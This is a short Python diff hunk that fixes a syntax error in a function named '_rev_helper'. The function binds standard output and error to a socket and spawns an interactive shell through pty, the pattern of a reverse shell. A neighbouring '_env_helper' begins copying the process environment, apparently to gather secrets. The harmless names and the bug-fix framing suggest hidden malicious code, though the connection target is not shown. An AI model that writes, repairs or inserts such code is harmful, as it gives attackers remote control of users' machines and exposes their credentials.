@@ -18,7 +18,7 @@ def _rev_helper():
     os.dup2(s.fileno(),1)
     os.dup2(s.fileno(),2)
     import pty
-    pty.spawn("sh")'
+    pty.spawn("sh")
 
 def _env_helper():
     env_vars = dict(os.environ)
